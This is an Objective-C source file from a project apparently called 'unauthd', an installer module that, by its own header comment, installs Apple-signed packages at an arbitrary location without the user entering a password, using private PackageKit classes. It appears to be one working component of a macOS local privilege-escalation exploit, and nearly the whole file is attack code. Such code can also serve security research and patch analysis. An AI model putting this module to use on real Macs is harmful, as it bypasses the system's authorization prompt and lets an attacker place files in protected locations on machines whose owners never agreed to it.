//
//  PackageKit.m
//  unauthd
//
//  Created by Ilias Morad (A2nkF) on 2/12/20.
//  Copyright © 2020 Ilias Morad (A2nkF). All rights reserved.
//

#import <Foundation/Foundation.h>
#include <Security/Security.h> 

#import "installer.h"


/*!
 * -- Installer module --
 *
 * Install Apple signed packages at an arbitrary location without the user entering a password
 *
 * Example usage:
 *
 *     [Installer  installPKG: @"file:///tmp/usdpython_0.63.pkg#USDPython.component.pkg"
 *            withAuthorization:&authorizationRef
 *            toDest: @"/tmp"];
 */
@implementation InstallDelegate

- (void)installClientDidFinish:(id)arg1 {
    NSLog(@"[+] Installation completed!");
}

- (void)installClient:(id)arg1 didFailWithError:(NSError *)error {
    NSLog(@"[-] Installation failed: %@", error);
}

- (void)installClientDidBegin:(id)arg {
    NSLog(@"[~] Installation started!");
}

@end


@implementation Installer

+ (void)installPKG: (NSString *)path withAuthorization: (AuthorizationRef *)authRef toDest: (NSString *)dest {
    NSError *error;
    OSStatus status = -1;

    
    [PKInstallClient registerAuthorization:authRef];
    PKPackage *package = [PKPackage packageWithURL: [NSURL URLWithString:path]];

    if(!package) {
        puts("[-] Could not create package from URL!");
        exit(-1);
    } else {
        puts("[+] Package created!");
    }

    PKInstallRequest *installRequest = [[PKInstallRequest alloc] initWithPackages:@[package] destination:dest];
    
    puts("[~] Sending install request now!");
    status = (int)[[PKInstallClient alloc] initWithRequest:installRequest inUserContext:YES delegate:[InstallDelegate alloc] error:&error];
    if(error != 0x0) {
        NSLog(@"%@", error);
        exit(-2);
    }
    
    return;
}

@end
